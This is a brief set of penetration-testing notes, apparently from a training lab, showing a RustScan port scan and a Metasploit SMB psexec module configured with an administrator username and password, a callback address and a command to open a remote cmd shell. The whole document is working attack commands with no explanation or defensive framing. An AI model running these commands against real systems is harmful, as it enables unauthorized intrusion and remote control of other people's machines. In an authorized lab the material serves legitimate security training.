# Simple usage

```shell
rustscan -a 10.129.201.160 --ulimit 5000
```

```shell
msfconsole

search smb/psexec

use exploit/windows/smb/psexec
use 2

set RHOSTS 10.129.180.71
set SHARE ADMIN$
set SMBUser Administrator
set SMBPass P@ssw0rd
set LHOST 10.10.14.222
exploit
```

Get a cmd shell

```shell
shell
```
